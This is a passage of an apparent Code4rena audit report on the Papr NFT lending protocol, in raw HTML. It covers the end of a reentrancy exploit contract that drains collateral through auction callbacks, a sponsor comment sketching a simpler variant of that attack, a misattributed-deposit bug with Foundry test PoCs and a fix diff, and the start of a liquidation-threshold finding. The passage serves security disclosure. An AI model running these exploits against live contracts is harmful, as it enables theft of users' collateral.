class=\"grvsc-line\"><span class=\"grvsc-source\">            PriceKind.LOWER,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iPaprController.increaseDebt(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            maxDebt,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP5: removing the NFT with id 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Collateral[] memory collateralArr = new Collateral[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        iPaprController.removeCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            collateralArr,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ///// STEP16: selling 10 NFTs and repaying the flash loan</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Selling the 10 NFTs</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Repaying the flash loan</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function onERC721Received(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes calldata data</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external returns (bytes4) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        numOfCallback++;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (numOfCallback &lt; 9) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ///// STEP6 - STEP13: removing the NFTs with id 2 to 9</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Collateral[] memory collateralArr = new Collateral[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            collateralArr[0] = Collateral({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                addr: nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                id: _id + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            iPaprController.removeCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                collateralArr,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ///// STEP14: starting the auction for NFT with id 10</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Collateral memory lastCollateral = Collateral({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                addr: nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                id: _id + 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            iPaprController.startLiquidationAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                lastCollateral,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ///// STEP15: buying the NFT with id 10 on the auction</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                PriceKind.LOWER,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 startPrice = (oraclePrice * 3 * 1e18) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                iFundingRateController.updateTarget();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Auction memory auction = Auction({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                nftOwner: address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                auctionAssetID: 10,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                auctionAssetContract: nftCollectionAddress,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                perPeriodDecayPercentWad: 0.7e18,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                secondsInPeriod: 1 days,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                startPrice: startPrice,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                paymentAsset: paprToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            iPaprController.purchaseLiquidationAuctionNFT(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                auction,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                startPrice,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(this),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Adding a reentrancy guard to the involved functions can be a solution.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/102#issuecomment-1370990330\">wilsoncusack (Backed) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>There is actually a simpler attack here: add one NFT and borrow max debt. Start Liquidation auction and purchase. On purchase reenter via safeTransferFrom and add many more NFTs, borrowing max. Purchase thinks this is the borrowers last NFT and debt is set to 0. Now borrower can withdraw all other NFTs for free.</p>\n<p>We could:</p>\n<ul>\n<li>change removeCollateral to have the debt check BEFORE we send the NFT out, which would prevent sell to repay flows </li>\n<li>add a reentrancy guard on startAuction so that it can’t be composed with others. </li>\n<li>add a reentrancy guard on purchase so that it can’t be composed with others </li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"h-03-collateral-nft-deposited-to-a-wrong-address-when-transferred-directly-to-paprcontroller\" style=\"position:relative;\"><a href=\"#h-03-collateral-nft-deposited-to-a-wrong-address-when-transferred-directly-to-paprcontroller\" aria-label=\"h 03 collateral nft deposited to a wrong address when transferred directly to paprcontroller permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/183\">[H-03] Collateral NFT deposited to a wrong address, when transferred directly to <code>PaprController</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/183\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/271\">Koolex</a>, <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/153\">Ruhum</a>, and <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/121\">rotcivegaf</a></em></p>\n<p>Users will lose collateral NFTs when they are transferred to <code>PaprController</code> by an approved address or an operator.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>PaprController</code> allows users to deposit NFTs as collateral to borrow Papr tokens. One way of depositing is by transferring an NFT to the contract directly via a call to <code>safeTransferFrom</code>: the contract implements the <code>onERC721Received</code> hook that will handle accounting of the transferred NFT (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L159\">PaprController.sol#L159</a>). However, the hook implementation uses a wrong argument to identify token owner: the first argument, which is used by the contract to identify token owner, is the address of the <code>safeTransferFrom</code> function caller, which may be an approved address or an operator. The actual owner address is the second argument (<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436\">ERC721.sol#L436</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC721Receiver</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">).</span><span class=\"mtk11\">onERC721Received</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">retval</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>Thus, when an NFT is sent by an approved address or an operator, it’ll be deposited to the vault of the approved address or operator:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// test/paprController/OnERC721ReceivedTest.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSafeTransferByOperator_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x12345</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NFT was deposited to the operator&#39;s vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">VaultInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">operator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Borrower has 0 tokens in collateral.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSafeTransferByApproved_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">approved</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x12345</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">approved</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">approved</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeTransferReceivedArgs</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NFT was deposited to the approved address&#39;s vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">VaultInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">approved</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Borrower has 0 tokens in collateral.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vaultInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider this change:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -156,7 +156,7 @@ contract PaprController is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _id the id of the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param data encoded IPaprController.OnERC721ReceivedArgs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return selector indicating succesful receiving of the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function onERC721Received(address from, address, uint256 _id, bytes calldata data)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function onERC721Received(address, address from, uint256 _id, bytes calldata data)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         returns (bytes4)</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/183\">wilsoncusack (Backed) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-users-may-be-liquidated-right-after-taking-maximal-debt\" style=\"position:relative;\"><a href=\"#h-04-users-may-be-liquidated-right-after-taking-maximal-debt\" aria-label=\"h 04 users may be liquidated right after taking maximal debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190\">[H-04] Users may be liquidated right after taking maximal debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190\">Jeiwan</a></em></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Since there’s no gap between the maximal LTV and the liquidation LTV, user positions may be liquidated as soon as maximal debt is taken, without leaving room for collateral and Papr token prices fluctuations. Users have no chance to add more collateral or reduce debt before being liquidated. This may eventually create more uncovered and bad debt for the protocol.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor 